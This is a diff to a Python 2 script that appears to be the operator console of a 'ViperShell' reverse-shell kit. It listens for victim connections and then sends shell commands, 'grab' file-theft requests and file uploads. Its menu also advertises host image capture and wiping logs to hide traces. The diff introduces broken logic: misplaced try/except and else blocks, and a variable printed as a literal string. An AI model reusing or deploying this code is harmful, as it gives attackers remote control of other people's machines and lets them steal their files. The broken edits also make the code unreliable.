@@ -2,6 +2,7 @@
 
 import socket
 import os
+import time
 
 
 """This is python reverse shell that grabs files or information and reports back to the server!"""
@@ -31,9 +32,6 @@ def menu():
     print "[*] capture      ========= > take images of the host machine " #Working on this
     print "[*] Cover        ========= > Delete all traces of logs" #TODO
     print "\n"
-
-
-
 
 def transfer(conn,command):
     conn.send(command)
@@ -66,44 +64,63 @@ def send(s, path, command):
 
 
 def connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("10.11.0.202", 8081)) #modify this line here to whatever you want
-    s.listen(1)
-    print '[+] listening for incoming TCP connection on port 8081'
-    conn, addr = s.accept()
-    print '[+] We got a connection from: ',addr
-
-
-
-    while True:
-        command = raw_input("$ ViperShell>> ")
-
-        if 'terminate' in command:
-            conn.send('terminate')
-            conn.close() #close the connection with host
-            break
-        
-        elif 'grab' in command:
-            #usage shell > grab*file
-            transfer(conn,command)
-        elif 'send' in command:
-            conn.send(command)
-            sendW,path = command.split('*')
+    try:
+        while True:
+            ip = (raw_input("Enter the LHOST IP: "))
+            port = int(raw_input("Enter the LHOST port: "))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
-                send(conn, path, command)
-            except Exception,e:
-                s.send (str(e))
-                pass
-        else:
-            conn.send(command) #send command
-            print conn.recv(1024)
+                s.bind((ip, port))
+                print "[+] ip", ip, "is open"
+                print "[+] port", port, "is open"
+            except socket.error:
+                time.sleep( 3.0)
+                print "[+] ip", ip, "is closed"
+                print "[+] port", port, "is closed"
+                print 'Socket connect failed! Loop up and try socket again'
+                connect()
+    
+            s.listen(1)
+            print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
+            conn, addr = s.accept()
+            print '[+] We got a connection from: ',addr
 
 
+
+            while True:
+                command = raw_input("$ ViperShell>> ")
+                if 'terminate' in command:
+                    conn.send('terminate')
+                    conn.close() #close the connection with host
+                    break
+        
+                elif 'grab' in command:
+                #usage shell > grab*file
+                    transfer(conn,command)
+                elif 'send' in command:
+                    conn.send(command)
+                    sendW,path = command.split('*')
+                try:
+                    send(conn, path, command)
+                except Exception,e:
+                    s.send (str(e))
+                    pass
+            else:
+                conn.send(command) #send command
+                print conn.recv(1024)
+
+    except KeyboardInterrupt:
+        print 'interrupted!'
+        print 'returning to main program'
+        os.system('python ../../viper.py')
+        
+
+        
 
 def main():
-	banner()
-	menu()
-	connect()
+    banner()
+    menu()
+    connect()
 
 if __name__ == "__main__":
-	main()
+    main()
